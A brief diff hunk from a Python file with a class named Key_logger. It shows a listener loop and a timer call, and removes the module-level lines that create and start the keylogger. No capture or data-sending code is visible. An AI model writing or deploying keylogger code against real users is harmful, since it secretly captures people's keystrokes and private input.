@@ -70,6 +70,3 @@ class Key_logger:
         with listener:
             self.start_timer()
             listener.join()
-
-logger = Key_logger()
-logger.start_logger()
